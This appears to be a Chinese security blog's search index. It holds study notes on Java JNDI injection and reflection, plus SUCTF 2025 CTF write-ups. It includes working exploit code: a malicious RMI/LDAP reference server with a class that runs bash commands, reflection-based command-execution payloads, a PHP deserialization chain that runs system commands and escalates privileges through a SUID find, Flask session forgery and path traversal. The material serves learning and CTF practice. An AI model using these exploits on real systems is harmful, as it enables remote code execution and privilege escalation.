[{"categories":null,"content":"有吗兄弟？ ","date":"2025-02-22","objectID":"/about/:0:0","tags":null,"title":"关于","uri":"/about/"},{"categories":["JavaSec"],"content":"动态代理\r定义：JVM在运行期动态创建class字节码并加载的过程 ","date":"2025-01-29","objectID":"/cybersec/470020000/:1:0","tags":["Java","RMI"],"title":"Java RMI 学习","uri":"/cybersec/470020000/"},{"categories":["JavaSec"],"content":"JDK 动态代理\rjava.lang.reflect.InvocationHandler Object invoke(Object proxy, Method method, Object[] args) 定义了代理对象调用方法时希望执行的动作，用于集中处理在动态代理类对象上的方法调用 java.lang.reflect.Proxy static Object newProxyInstance(ClassLoader loader, Class[] interfaces, InvocationHandler h) 创建一个实例，需要三个参数： 接口类的 ClassLoader 接口数组 处理接口方法调用的 InvocationHandler 实例。 static InvocationHandler getInvocationHandler(Object proxy) 获取指定代理对象所关联的调用处理器 static Class getProxyClass(ClassLoader loader, Class... interfaces) 获取指定接口的代理类 static boolean isProxyClass(Class cl) 判断 cl 是否为一个代理类 跟着写了一个动态代理的代码，比较简单的一小段 package com.mingzux; import java.lang.reflect.InvocationHandler; import java.lang.reflect.Method; import java.lang.reflect.Proxy; public class DynamicProxy { public static void main(String[] args) { InvocationHandler handler = new InvocationHandler() { @Override public Object invoke(Object proxy, Method method, Object[] args) throws Throwable { System.out.println(method); if (method.getName().equals(\"morning\")) { System.out.println(\"Good Morning, \" + args[0]); } return null; } }; Hello hello = (Hello) Proxy.newProxyInstance( Hello.class.getClassLoader(), new Class[] { Hello.class }, handler ); hello.morning(\"Mingzu\"); } } interface Hello { void morning(String name); } ","date":"2025-01-29","objectID":"/cybersec/470020000/:1:1","tags":["Java","RMI"],"title":"Java RMI 学习","uri":"/cybersec/470020000/"},{"categories":["JavaSec"],"content":"JNDI 注入\rJava Naming and DirectoryInterface（Java命名和目录接口） 重要：需要知道 jdk 版本号 ","date":"2025-01-29","objectID":"/cybersec/470020000/:2:0","tags":["Java","RMI"],"title":"Java RMI 学习","uri":"/cybersec/470020000/"},{"categories":["JavaSec"],"content":"RMI 攻击向量\rJNDI 有一个 Reference 类表示对某个对象的引用，而对象的传递无非就是两种方式： 按序列化方式存储（值传递） 按引用的方式存储（引用传递） 利用技巧： 将恶意 Reference 类绑定在 RMI 注册表，指向远程 class 文件 当 JNDI 客户端 lookup() 函数外部可控或 Reference 类构造方法的 classFactoryLocation 参数外部可控时，实现加载远程 class 文件在本地执行，实现远程代码执行 RMIService.jvav package com.mingzux.JNDI; import com.sun.jndi.rmi.registry.ReferenceWrapper; import javax.naming.Reference; import java.rmi.registry.LocateRegistry; import java.rmi.registry.Registry; public class RMIService { public static void main(String[] args) throws Exception { Registry registry = LocateRegistry.createRegistry(1099); Reference refObj = new Reference(\"EvilObject\", \"EvilObject\", \"http://127.0.0.1:8000/\"); ReferenceWrapper refObjWrapper = new ReferenceWrapper(refObj); System.out.println(\"Binding 'refObjWrapper' to 'rmi://127.0.0.1:1099/refObj'\"); registry.bind(\"refObj\", refObjWrapper); } } JNDIClient.java package com.mingzux.JNDI; import javax.naming.Context; import javax.naming.InitialContext; public class JNDIClient { public static void main(String[] args) throws Exception { // System.setProperty(\"com.sun.jndi.rmi.object.trustURLCodebase\", \"true\"); String uri = \"rmi://127.0.0.1:1099/refObj\"; Context ctx = new InitialContext(); System.out.println(\"Using lookup() to fetch object with \" + uri); ctx.lookup(uri); } } EvilObject.java import java.io.BufferedReader; import java.io.InputStreamReader; public class EvilObject { public EvilObject() throws Exception { Runtime rt = Runtime.getRuntime(); String[] commands = {\"/bin/bash\", \"-c\", \"ls /\"}; Process pc = rt.exec(commands); BufferedReader result = new BufferedReader(new InputStreamReader(pc.getInputStream())); String data; while((data = result.readLine()) != null) { System.out.println(data); } pc.waitFor(); } } ","date":"2025-01-29","objectID":"/cybersec/470020000/:2:1","tags":["Java","RMI"],"title":"Java RMI 学习","uri":"/cybersec/470020000/"},{"categories":["JavaSec"],"content":"LDAP 攻击向量\r版本：8u191、7u201、6u211与8u121、7u131、6u141之间 利用技巧：与上面RMI Reference基本一致，只是lookup()中的URL为一个LDAP地址 看了好几遍，然后边写边看跟着抄了一遍，大致了解了，先过（） LdapServer.java package com.mingzux.Ldap; import com.unboundid.ldap.listener.InMemoryDirectoryServer; import com.unboundid.ldap.listener.InMemoryDirectoryServerConfig; import com.unboundid.ldap.listener.InMemoryListenerConfig; import com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult; import com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor; import com.unboundid.ldap.sdk.Entry; import com.unboundid.ldap.sdk.LDAPException; import com.unboundid.ldap.sdk.LDAPResult; import com.unboundid.ldap.sdk.ResultCode; import javax.net.ServerSocketFactory; import javax.net.SocketFactory; import javax.net.ssl.SSLSocketFactory; import java.net.InetAddress; import java.net.MalformedURLException; import java.net.URL; public class LdapServer { private static final String LDAP_BASE = \"dc=mingzux,dc=com\"; public static void main (String[] args) { String url = \"http://127.0.0.1:8000/#EvilObject\"; int port = 1234; try { InMemoryDirectoryServerConfig config = new InMemoryDirectoryServerConfig(LDAP_BASE); config.setListenerConfigs(new InMemoryListenerConfig( \"listen\", InetAddress.getByName(\"0.0.0.0\"), port, ServerSocketFactory.getDefault(), SocketFactory.getDefault(), (SSLSocketFactory) SSLSocketFactory.getDefault() )); config.addInMemoryOperationInterceptor(new OperationInterceptor(new URL(url))); InMemoryDirectoryServer ds = new InMemoryDirectoryServer(config); System.out.println(\"Listening on 0.0.0.0:\" + port); ds.startListening(); } catch (Exception e) { e.printStackTrace(); } } private static class OperationInterceptor extends InMemoryOperationInterceptor { private URL codebase; public OperationInterceptor(URL cb) { this.codebase = cb; } public void processSearchResult (InMemoryInterceptedSearchResult result) { String base = result.getRequest().getBaseDN(); Entry e = new Entry(base); try { sendResult(result, base, e); } catch (Exception e1) { e1.printStackTrace(); } } protected void sendResult (InMemoryInterceptedSearchResult result, String base, Entry e) throws LDAPException, MalformedURLException { URL turl = new URL(this.codebase, this.codebase.getRef().replace('.', '/').concat(\".class\")); System.out.println(\"Send LDAP reference result for \" + base + \" redirecting to \" + turl); e.addAttribute(\"javaClassName\", \"Exploit\"); String cbstring = this.codebase.toString(); int refPos = cbstring.indexOf(\"#\"); if (refPos \u003e 0) { cbstring = cbstring.substring(0, refPos); } e.addAttribute(\"javaCodeBase\", cbstring); e.addAttribute(\"objectClass\", \"javaNamingReference\"); e.addAttribute(\"javaFactory\", this.codebase.getRef()); result.sendSearchEntry(e); result.setResult(new LDAPResult(0, ResultCode.SUCCESS)); } } } JNDIClient.java package com.mingzux.Ldap; import javax.naming.Context; import javax.naming.InitialContext; public class JNDIClient { public static void main(String[] args) throws Exception { String uri = \"ldap://127.0.0.1:1234/remoteObj\"; Context ctx = new InitialContext(); System.out.println(\"Using lookup() to fetch object with \" + uri); ctx.lookup(uri); } } EvilObject.java 没变，跟上一节一样 ","date":"2025-01-29","objectID":"/cybersec/470020000/:2:2","tags":["Java","RMI"],"title":"Java RMI 学习","uri":"/cybersec/470020000/"},{"categories":["JavaSec"],"content":"Java Reflection 学习\rjdk 1.8.0_72 ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:1:0","tags":["Java","Reflection"],"title":"Java Reflection 学习","uri":"/cybersec/353b3b4/"},{"categories":["JavaSec"],"content":"反射机制简述\rjava 在运行时： 对于任意一个类，能获取它的所有方法、属性、构造器 任意一个对象，能调用它的所有方法、修改它的属性（包括私有属性） 这种动态获取信息，动态调用对象方法的功能，就是反射机制 通过反射，就将 Java 这类静态语言附加上了动态特性 那么什么是动态特性？ p牛：一段代码，改变其中的变量，将会导致这段代码产生功能性的变化，我称之为动态特性。 举例说明 public void execute(String className, String methodName) throws Exception { Class clazz = Class.forName(className); clazz.getMethod(methodName).invoke(clazz.newInstance()); } 这段代码中改变传入参数的值，将会调用不同类的不同方法 ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:2:0","tags":["Java","Reflection"],"title":"Java Reflection 学习","uri":"/cybersec/353b3b4/"},{"categories":["JavaSec"],"content":"forName\rforName 有两个函数重载 Class\u003c?\u003e forName(String name) Class\u003c?\u003e forName(String name, boolean initialize, ClassLoader loader) 第一种相当于第二种的一个封装，等价于： Calss\u003c?\u003e forName(String name, true, currentLoader) 即自动初始化，并根据类名加载类 关于初始化这个概念需要理解一下： 在 forName 时，类的构造函数并不会执行，这个初始化其实是“类初始化” public class Test { { System.out.println(\"Instance Initialization Block.\"); } static { System.out.println(\"Static Initialization Block.\"); } public Test() { System.out.println(\"Constructor.\"); } } 三个块的执行顺序是： 类初始化时 static {} 先被调用 {} 会在构造函数之前执行，因为他的代码会放在构造函数的 super() 后面，构造函数的内容前面 所以如果执行 Test test = new Test(); ，将会输出： Static Initialization Block. Instance Initialization Block. Constructor. 而如果执行 Class.forName() ，将会输出 Static Initialization Block. initialize 设为 false 时，类不会初始化，无输出 所以对于上面的 execute() 函数，可以仅利用第一句，将恶意类的恶意代码放在 static {} 内，从而实现执行 public void execute(String className, String methodName) throws Exception { Class clazz = Class.forName(className); // clazz.getMethod(methodName).invoke(clazz.newInstance()); } ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:3:0","tags":["Java","Reflection"],"title":"Java Reflection 学习","uri":"/cybersec/353b3b4/"},{"categories":["JavaSec"],"content":"内部类和单例\rJava 的普通类 C1 中可以编写内部类 C2 ，在编译时生成两个文件： C1.class 和 C1$C2.class ，可通过 Class.forName(\"C1$C2\") 加载内部类，然后可以使用 newInstance() 调用类的无参构造函数实例化这个类 有时候会遇到使用 newInstance 成功不了，原因可能是： 使用的类没有无参构造函数 使用的类的构造函数是私有的 例如， java.lang.Runtime ，执行以下代码将会报错 Class clazz = Class.forName(\"java.lang.Runtime\"); clazz.getMethod(\"exec\", String.class).invoke(clazz.newInstance(), \"id\"); 因为 Runtime 类的无参构造方法是私有的，我们可以看到， Runtime 类是典型的饿汉式单例： public class Runtime { private static Runtime currentRuntime = new Runtime(); public static Runtime getRuntime() { return currentRuntime; } /** Don't let anyone else instantiate this class */ private Runtime() {} 所以只能通过 getRuntime() 获取 Runtime 对象了，修改 payload Class clazz = Class.forName(\"java.lang.Runtime\"); clazz.getMethod(\"exec\", String.class).invoke(clazz.getMethod(\"getRuntime\").invoke(clazz), \"id\"); 设计模式之 “单例模式” 举例说明，对于 web 应用，数据库连接只需要建立一次，而不需要每次使用数据库时都重新连接，所以为了实现这样的目标，我们可以将数据库连接所使用的类设置为私有，然后编写静态方法来获取，从而实现：只有类初始化时执行一次构造函数，之后只允许通过 getInstance() 获取该对象，避免重复建立数据库连接 核心思想： 唯一性：限制类只能被实例化一次 全局访问：提供统一的访问入口，方便其他对象使用该实例 实现方式： 饿汉式（Eager Initialization） 饿汉式 类加载时立即创建实例（线程安全） public class Database { private static final Database INSTANCE = new Database(); private Database() {} public static Database getInstance() { return INSTANCE; } } Enum 防止反射和序列化破坏单例（线程安全） public class Database { enum Db { INSTANCE; private Db() {} public void connect() { // 数据库连接 } } } 懒汉式（Lazy Initialization） 双重检验锁方式（Double-Checked Locking） 延迟实例化，首次调用时创建（需要处理线程安全） public class Database { private static volatile Database INSTANCE; private Database() {} public static Database getInstance() { if (INSTANCE == null) { synchronized (Database.class) { if (INSTANCE == null) { INSTANCE = new Database(); } } } return INSTANCE; } } 静态内部类方式（Holder Class） 利用类加载机制保证线程安全，且延迟加载 public class Database { private Database() {} private static class Holder { static final Database INSTANCE = new Database(); } public static Database getInstance() { return Holder.INSTANCE; } } 回到主线，看一下这两种情况下怎么通过反射实例化类？ ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:4:0","tags":["Java","Reflection"],"title":"Java Reflection 学习","uri":"/cybersec/353b3b4/"},{"categories":["JavaSec"],"content":"一：没有无参构造函数\r使用 getConstructor 方法获取构造函数，然后使用 newInstance 实例化 以 ProcessBuilder 为例 public final class ProcessBuilder { private List\u003cString\u003e command; private File directory; private Map\u003cString,String\u003e environment; private boolean redirectErrorStream; private Redirect[] redirects; public ProcessBuilder(List\u003cString\u003e command) { if (command == null) throw new NullPointerException(); this.command = command; } public ProcessBuilder(String... command) { this.command = new ArrayList\u003c\u003e(command.length); for (String arg : command) this.command.add(arg); } public ProcessBuilder command(List\u003cString\u003e command) { if (command == null) throw new NullPointerException(); this.command = command; return this; } public List\u003cString\u003e command() { return command; } // 略 } 对于第一个构造函数 public ProcessBuilder(List\u003cString\u003e command) {} payload （强制类型转换） Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); ((ProcessBuilder)clazz.getConstructor(List.class).newInstance(Arrays.asList(\"id\"))).start(); payload （完全使用反射） Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getMethod(\"start\").invoke(clazz.getConstructor(List.class).newInstance(Arrays.asList(\"id\"))); 对于第二个构造函数 public ProcessBuilder(String... command) {} 等价于 public ProcessBuilder(String[] command) {} payload （强制类型转换） Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); ((ProcessBuilder)clazz.getConstructor(String[].class).newInstance(new String[][]{{\"id\"}})).start(); payload （完全使用反射） Class clazz = Class.forName(\"java.lang.ProcessBuilder\"); clazz.getMethod(\"start\").invoke(clazz.getConstructor(String[].class).newInstance(new String[][]{{\"id\"}})); ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:4:1","tags":["Java","Reflection"],"title":"Java Reflection 学习","uri":"/cybersec/353b3b4/"},{"categories":["JavaSec"],"content":"二：构造函数私有\r使用 getDeclaredMethod 和 getDeclaredConstructor 方法，或者先获取单例 以 Runtime 为例 payload （使用 getDeclared） Class clazz = Class.forName(\"java.lang.Runtime\"); Constructor constructor = clazz.getDeclaredConstructor(); constructor.setAccessible(true); // 修改作用域 Process process = (Process) clazz.getMethod(\"exec\", String.class).invoke(constructor.newInstance(), \"id\"); payload （获取单例，跟单例介绍前面是一样的） Object runtimeInstance = Class.forName(\"java.lang.Runtime\").getMethod(\"getRuntime\").invoke(null); Class.forName(\"java.lang.Runtime\").getMethod(\"exec\", String.class).invoke(runtimeInstance, \"id\"); 怎么确定命令是否执行成功？（以上面这两句为例） // 可以打印结果，也可以调用一个可执行的程序，例如 calc.exe Process process = (Process) Class.forName(\"java.lang.Runtime\").getMethod(\"exec\", String.class).invoke(runtimeInstance, \"id\"); InputStream inputStream = process.getInputStream(); BufferedReader reader = new BufferedReader(new InputStreamReader(inputStream)); String line; while ((line = reader.readLine()) != null) { System.out.println(line); } ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:4:2","tags":["Java","Reflection"],"title":"Java Reflection 学习","uri":"/cybersec/353b3b4/"},{"categories":["JavaSec"],"content":"读取修改公有私有属性和被 final 或 static final 修饰的成员变量\rpackage com.mingzux; import java.lang.reflect.Field; import java.lang.reflect.Modifier; public class TestReflection { public static void main(String[] args) throws Exception { // 获取类和对象 Class mz = SDUer.class; SDUer mingzu = (SDUer) mz.getDeclaredConstructor().newInstance(); // 获取继承的 public 字段 - name Field name = mz.getField(\"name\"); System.out.println(name); // 读取 name 的值, 需要该类的对象, 而不是类 System.out.println(name.get(mingzu)); // 修改 name 的值, 需要该类的对象, 而不是类 name.set(mingzu, \"M!ng2u\"); System.out.println(name.get(mingzu)); // 获取 private 字段 - sduId Field sduId = mz.getDeclaredField(\"sduId\"); System.out.println(sduId); // 读取 sduId 的值，同样需要对象 sduId.setAccessible(true); // private 需要 setAccessible System.out.println(sduId.get(mingzu)); // 修改 sduId 的值 sduId.set(mingzu, \"2333333\"); System.out.println(sduId.get(mingzu)); // 获取继承的 protected 字段 - id Field id = mz.getSuperclass().getDeclaredField(\"id\"); System.out.println(id); // 读取 id 的值 System.out.println(id.get(mingzu)); // 修改 id 的值 id.set(mingzu, \"31415926535\"); System.out.println(id.get(mingzu)); // 获取继承的被 final 修饰的字段 - species Field species = mz.getField(\"species\"); System.out.println(species); // 读取 species 的值 System.out.println(species.get(mingzu)); // 修改 species 的值 // 获取 species 的 modifiers Field speciesModifiers = species.getClass().getDeclaredField(\"modifiers\"); System.out.println(speciesModifiers); // 读取 modifiers 的值 speciesModifiers.setAccessible(true); System.out.println(speciesModifiers.get(species)); // 将 modifiers 中的 final 去掉 speciesModifiers.setInt(species, species.getModifiers() \u0026 ~Modifier.FINAL); System.out.println(speciesModifiers.get(species)); // 这时候就可以修改 species 的值了 species.setAccessible(true); species.set(mingzu, \"Visitor\"); System.out.println(species.get(mingzu)); // 获取被 static final 修饰的字段 - university Field university = mz.getDeclaredField(\"university\"); System.out.println(university); // 读取 university 的值 university.setAccessible(true); System.out.println(university.get(mingzu)); university.setAccessible(false); //这里不设 false 会寄, 可能是下面权限检查过不了 // 修改 university 的值 // 获取 university 的 modifiers Field universityModifiers = university.getClass().getDeclaredField(\"modifiers\"); System.out.println(universityModifiers); // 读取 modifiers 的值 universityModifiers.setAccessible(true); System.out.println(universityModifiers.get(university)); // 将 modifiers 中的 static final 去掉 universityModifiers.setInt(university, university.getModifiers() \u0026 ~Modifier.FINAL); System.out.println(universityModifiers.get(university)); // 修改 university 的值 university.set(mingzu, \"minihash\"); System.out.println(university.get(mingzu)); System.out.println(mingzu.university); // 由于 JVM 内联优化, 包含 final 修饰的 university 的这句会被改成 // System.out.println(\"SDU\"); // 所以只能用上面的 Field.get(Object obj) 方法获取 } } class SDUer extends Person { public static final String university = \"SDU\"; private String sduId = \"202322171145\"; @Override public String toString() { return \"SDUer [sduId=\" + sduId + \", name=\" + name + \", id=\" + id + \", university=\" + university + \"]\"; } } class Person { public String name = \"Mingzu\"; public String gender = \"M\"; protected String id = \"1145141919810\"; public final String species = \"Human\"; } 输出结果为 ------------------------------------------------------ public java.lang.String com.mingzux.Person.name Mingzu M!ng2u ------------------------------------------------------ private java.lang.String com.mingzux.SDUer.sduId 202322171145 2333333 ------------------------------------------------------ protected java.lang.String com.mingzux.Person.id 1145141919810 31415926535 ------------------------------------------------------ public final java.lang.String com.mingzux.Person.species Human private int java.lang.reflect.Field.modifiers 17 1 Visitor ------------------------------------------------------ public static final java.lang.String com.mingzux.SDUer.university SDU private int java.lang.reflect.Field.modifiers 25 9 minihash SDU ","date":"2025-01-29","objectID":"/cybersec/353b3b4/:5:0","tags":["Java","Reflection"],"title":"Java Reflection 学习","uri":"/cybersec/353b3b4/"},{"categories":["CTF"],"content":"SUCTF 2025 （复现）\r","date":"2025-01-24","objectID":"/cybersec/cc76721/:1:0","tags":["CTF"],"title":"SUCTF 2025","uri":"/cybersec/cc76721/"},{"categories":["CTF"],"content":"web\r","date":"2025-01-24","objectID":"/cybersec/cc76721/:2:0","tags":["CTF"],"title":"SUCTF 2025","uri":"/cybersec/cc76721/"},{"categories":["CTF"],"content":"SU_photogallery\r0x00 信息收集\r访问 /robots.txt ，提示 see see node.md 访问不存在的文件，出现下面这个界面 看过 wp 之后，了解到这是在提示 php -S 启动的服务 0x01 获取源码\r参考：https://projectdiscovery.io/blog/php-http-server-source-disclosure \u003c?php /* * @Author: Nbc * @Date: 2025-01-13 16:13:46 * @LastEditors: Nbc * @LastEditTime: 2025-01-13 16:31:53 * @FilePath: \\src\\unzip.php * @Description: * * Copyright (c) 2025 by Nbc, All Rights Reserved. */ error_reporting(0); function get_extension($filename){ return pathinfo($filename, PATHINFO_EXTENSION); } function check_extension($filename,$path){ $filePath = $path . DIRECTORY_SEPARATOR . $filename; if (is_file($filePath)) { $extension = strtolower(get_extension($filename)); if (!in_array($extension, ['jpg', 'jpeg', 'png', 'gif'])) { if (!unlink($filePath)) { // echo \"Fail to delete file: $filename\\n\"; return false; } else{ // echo \"This file format is not supported:$extension\\n\"; return false; } } else{ return true; } } else{ // echo \"nofile\"; return false; } } function file_rename ($path,$file){ $randomName = md5(uniqid().rand(0, 99999)) . '.' . get_extension($file); $oldPath = $path . DIRECTORY_SEPARATOR . $file; $newPath = $path . DIRECTORY_SEPARATOR . $randomName; if (!rename($oldPath, $newPath)) { unlink($path . DIRECTORY_SEPARATOR . $file); // echo \"Fail to rename file: $file\\n\"; return false; } else{ return true; } } function move_file($path,$basePath){ foreach (glob($path . DIRECTORY_SEPARATOR . '*') as $file) { $destination = $basePath . DIRECTORY_SEPARATOR . basename($file); if (!rename($file, $destination)){ // echo \"Fail to rename file: $file\\n\"; return false; } } return true; } function check_base($fileContent){ $keywords = ['eval', 'base64', 'shell_exec', 'system', 'passthru', 'assert', 'flag', 'exec', 'phar', 'xml', 'DOCTYPE', 'iconv', 'zip', 'file', 'chr', 'hex2bin', 'dir', 'function', 'pcntl_exec', 'array', 'include', 'require', 'call_user_func', 'getallheaders', 'get_defined_vars','info']; $base64_keywords = []; foreach ($keywords as $keyword) { $base64_keywords[] = base64_encode($keyword); } foreach ($base64_keywords as $base64_keyword) { if (strpos($fileContent, $base64_keyword)!== false) { return true; } else{ return false; } } } function check_content($zip){ for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (preg_match('/\\.\\.(\\/|\\.|%2e%2e%2f)/i', $fileName)) { return false; } // echo \"Checking file: $fileName\\n\"; $fileContent = $zip-\u003egetFromName($fileName); if (preg_match('/(eval|base64|shell_exec|system|passthru|assert|flag|exec|phar|xml|DOCTYPE|iconv|zip|file|chr|hex2bin|dir|function|pcntl_exec|array|include|require|call_user_func|getallheaders|get_defined_vars|info)/i', $fileContent) || check_base($fileContent)) { // echo \"Don't hack me!\\n\"; return false; } else { continue; } } return true; } function unzip($zipname, $basePath) { $zip = new ZipArchive; if (!file_exists($zipname)) { // echo \"Zip file does not exist\"; return \"zip_not_found\"; } if (!$zip-\u003eopen($zipname)) { // echo \"Fail to open zip file\"; return \"zip_open_failed\"; } if (!check_content($zip)) { return \"malicious_content_detected\"; } $randomDir = 'tmp_'.md5(uniqid().rand(0, 99999)); $path = $basePath . DIRECTORY_SEPARATOR . $randomDir; if (!mkdir($path, 0777, true)) { // echo \"Fail to create directory\"; $zip-\u003eclose(); return \"mkdir_failed\"; } if (!$zip-\u003eextractTo($path)) { // echo \"Fail to extract zip file\"; $zip-\u003eclose(); } else{ for ($i = 0; $i \u003c $zip-\u003enumFiles; $i++) { $fileInfo = $zip-\u003estatIndex($i); $fileName = $fileInfo['name']; if (!check_extension($fileName, $path)) { // echo \"Unsupported file extension\"; continue; } if (!file_rename($path, $fileName)) { // echo \"File rename failed\"; continue; } } } if (!move_file($path, $basePath)) { $zip-\u003eclose(); // echo \"Fail to move file\"; return \"move_failed\"; } rmdir($path); $zip-\u003eclose(); return true; } $uploadDir = __DIR__ . DIRECTORY_SEPARATOR . 'upload/suimages/'; if (!is_dir($uploadDir)) { mkdir($uploadDir, 0777, true); } if (isset($_F","date":"2025-01-24","objectID":"/cybersec/cc76721/:2:1","tags":["CTF"],"title":"SUCTF 2025","uri":"/cybersec/cc76721/"},{"categories":["CTF"],"content":"SU_POP\r0x00 参考资料\rSymfony 反序列化链分析 参考文章：https://forum.butian.net/share/2411 在 vendor/symfony/finder/Iterator/SortableIterator.php 中定义了 SortableIterator 类，实现了 IteratorAggregate 接口 __construct 接受一个迭代器 $iterator ，整型或回调函数 $sort ，以及布尔类型 $reverseOrder 如果传入一个 callable 的 $sort ，它将会被赋值给 $this-\u003esort 那么在调用 getIterator() 时，对于上述的 $sort ，由于不等于 1 或 -1 ，将会调用 uasort() uasort(array \u0026$array, callable $callback): true uasort() 有两个参数，第一个参数是 array ，第二个参数是一个函数，而这两个参数在构造时可指定，即参数可控，那么可以传入 call_user_func 方法，实现任意命令执行 那么下面构造链子的思路是寻找类中 __toString() ，__destruct() ，__wakeup() 中直接或间接使用 foreach 遍历成员变量的部分 0x01 代码审计\r拿到源码，先找一下利用点，看路由 \u003c?php use Cake\\Routing\\Route\\DashedRoute; use Cake\\Routing\\RouteBuilder; return function (RouteBuilder $routes): void { $routes-\u003esetRouteClass(DashedRoute::class); $routes-\u003escope('/', function (RouteBuilder $builder): void { $builder-\u003econnect('/', ['controller' =\u003e 'Pages', 'action' =\u003e 'display', 'home']); $builder-\u003econnect('/pages/*', 'Pages::display'); $builder-\u003eget('/ser', ['controller' =\u003e 'Pages', 'action' =\u003e 'handleSer']); $builder-\u003efallbacks(); }); }; 看起来利用点应该在 /ser ，查看一下 handleSer public function handleSer() { $ser = $this-\u003erequest-\u003egetQuery('ser'); unserialize(base64_decode($ser)); $this-\u003eset('ser', $ser); $this-\u003eviewBuilder()-\u003esetLayout('ajax'); $this-\u003erender('handle_ser'); } 确定了利用点，并且参数是 ser ，下面找反序列化的入口 搜索 __destruct ，最终找到 /vender/react/promise/src/Internal/RejectedPromise.php 的 __destruct 触发了 __toString 由于 $handler = set_rejection_handler(null); 永远返回 null ，且 $this-\u003ehandled 和 $this-\u003ereason 参数可控，所以这个 __toString 总会触发，下面找 __toString 有两个可能可以利用的 第一个是 /vendor/composer/composer/src/Composer/DependencyResolver/Pool.php ，找到了 foreach 第二个是 /vendor/cakephp/cakephp/src/Http/Response.php ， stream 可控 0x02 POP1\r由于 packages 可控，所以链子是 RejectedPromise::__destruct()-\u003ePool::__toString()-\u003eSortableIterator::getIterator() 吗？ 不是，因为附件版本的 SortableIterator 中指定了： private \\Closure|int $sort; 所以如果将字符串 \"call_user_func\" 赋值给 $sort 的话，将不能成功序列化/反序列化，所以另寻他类，找一个有 getIterator() 方法的类 搜索到的第一个就是，最轻松的一回， /vendor/cakephp/cakephp/src/Collection/Iterator $this-\u003e_executed 可控，看一下 _execute() 方法 protected function _execute(): void { $mapper = $this-\u003e_mapper; foreach ($this-\u003e_data as $key =\u003e $val) { $mapper($val, $key, $this); } if ($this-\u003e_intermediate \u0026\u0026 $this-\u003e_reducer === null) { throw new LogicException('No reducer function was provided'); } $reducer = $this-\u003e_reducer; if ($reducer !== null) { foreach ($this-\u003e_intermediate as $key =\u003e $list) { $reducer($list, $key, $this); } } $this-\u003e_intermediate = []; $this-\u003e_executed = true; } 这样的话 $mapper 和 $reducer 都可以用来执行命令，我这里使用 $mapper 所以要利用的链子是 RejectedPromise::__destruct()-\u003ePool::__toString()-\u003eMapReduce::_execute() poc 如下 \u003c?php namespace React\\Promise\\Internal; use Composer\\DependencyResolver\\Pool; class RejectedPromise { private $reason; private $handled = false; public function __construct() { $this-\u003ereason = new Pool(); } } namespace Composer\\DependencyResolver; use Cake\\Collection\\Iterator\\MapReduce; class Pool { protected $packages = []; public function __construct() { $this-\u003epackages = new MapReduce(); } } namespace Cake\\Collection\\Iterator; class MapReduce { protected bool $_executed = false; protected iterable $_data; protected $_mapper; public function __construct() { $this-\u003e_mapper = \"call_user_func\"; // $cmd = \"ls /\"; // $cmd = \"cat /flag.txt\"; // $cmd = \"find / -perm -u=s -type f 2\u003e/dev/null\"; // $cmd = \"find / -name flag.txt -exec whoami \\;\"; $cmd = \"find / -name flag.txt -exec cat /flag.txt \\;\"; $this-\u003e_data = [$cmd=\u003e\"system\"]; } } namespace React\\Promise\\Internal; echo base64_encode(serialize(new RejectedPromise())); ?\u003e GET /ser?ser=xxxx ， ls find 之类的命令可以执行且有回显，但是 cat /flag.txt 无回显，之前学长提到过 suid 提权（从 www-data 提到 root），试一下能不能行 find / -perm -u=s -type f 2\u003e/dev/null ，可以看到 find 有 suid 权限 /usr/bin/chsh /usr/bin/find /usr/bin/chfn /usr/bin/su /usr/bin/umount /usr/bin/passwd /usr/bin/mount /usr/bin/newgrp /usr/bin/gpasswd 执行 find / -name flag.txt -exec whoami \\; ，返回 root ，提权成功 执行 find / -name flag.txt -exec cat /flag.txt \\","date":"2025-01-24","objectID":"/cybersec/cc76721/:2:2","tags":["CTF"],"title":"SUCTF 2025","uri":"/cybersec/cc76721/"},{"categories":["CTF"],"content":"SU_blog\r0x00 信息收集\r注册一个 admin 用户（竟然让注册） 登陆后提示 md5 + 时间戳 生成了 SECRET 结合 Cookie 中的 jwt ，推测是 jwt 的 secretkey 0x01 session 伪造\r虽然允许注册 admin 用户，但是还是伪造一下 session 吧，wp 看到是非预期 之前用的是 flask-session-cookie-manager ，不能爆破， 官方 wp 给出 flask-unsign ，工具++ 生成字典 import time import hashlib wordlist = [] timestamp = int(time.time()) for i in range(timestamp - 1000000, timestamp + 1000000): wordlist.append(hashlib.md5(str(i).encode()).hexdigest()) with open(\"/home/mingzu/CTF/wordlist.txt\", \"w\") as f: for word in wordlist: f.write(word + \"\\n\") \u003e flask-unsign -u -c \"eyJ1c2VybmFtZSI6Im1pbmd6dSJ9.Z5UV3g.v4iJ--zejF0WE-AetwuuqaYPy-A\" --wordlist wordlist.txt --no-literal-eval [*] Session decodes to: {'username': 'mingzu'} [*] Starting brute-forcer with 8 threads.. [+] Found secret key after 996480 attempts2acb53068c17 b'c78e2cbce1051488f1f616939660a68d' 爆破出 secret ，伪造 session \u003e flask-unsign -s -c \"{'username': 'admin'}\" --secret 'c78e2cbce1051488f1f616939660a68d' eyJ1c2VybmFtZSI6ImFkbWluIn0.Z5UfEw.PWO_FglQqS-u7lTOfsl_BCMEzeE 0x02 获取源码\r点开 article ，GET /article?file= 的形式感觉是文件包含，读 articles/../articles/article1.txt 提示文件未找到，尝试双写绕过，路径正确 读 /etc/passwd 确定相对路径 读 /flag 返回读取文件时发生错误，不让直接读 GET /article?file=articles/..././app.py 拿到 app.py from flask import * import time,os,json,hashlib from pydash import set_ from waf import pwaf,cwaf app = Flask(__name__) app.config['SECRET_KEY'] = hashlib.md5(str(int(time.time())).encode()).hexdigest() users = {\"testuser\": \"password\"} BASE_DIR = '/var/www/html/myblog/app' articles = { 1: \"articles/article1.txt\", 2: \"articles/article2.txt\", 3: \"articles/article3.txt\" } friend_links = [ {\"name\": \"bkf1sh\", \"url\": \"https://ctf.org.cn/\"}, {\"name\": \"fushuling\", \"url\": 